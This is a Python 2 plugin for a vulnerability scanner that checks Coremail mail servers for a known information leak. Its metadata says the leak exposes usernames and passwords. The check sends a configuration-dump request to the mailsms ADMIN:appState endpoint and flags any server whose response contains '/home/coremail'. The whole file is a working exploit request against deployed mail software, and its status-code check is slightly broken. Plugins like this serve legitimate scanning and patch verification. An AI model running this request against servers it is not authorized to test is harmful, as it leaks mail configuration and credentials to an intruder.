#!/usr/bin/env python
#coding=utf-8
import requests,sys

def get_plugin_info():
    plugin_info = {
        "info": "Coremail信息泄露，可得到coremail用户名密码。",
        "source": 1,
        "name": "Coremail信息泄露",
        "keyword": "server:web",
        "level": "中危",
        "url": "https://www.t00ls.net/viewthread.php?tid=51510",
        "author": "zinc",
        "type": "信息泄露"
    }
    return plugin_info

def check(ip, port, timeout):

    url = "http://%s:%d/mailsms/s?func=ADMIN:appState&dumpConfig=/" % (ip, port)
    try:
        r = requests.get(url,timeout=timeout)
        if (r.status_code != '404') and ("/home/coremail" in r.text):
            print "mailsms is vulnerable: {0}".format(url)
            return u'信息泄露'

    except Exception as e:
        print e

if __name__ == '__main__':
    
    check('127.0.0.1', 80, 3)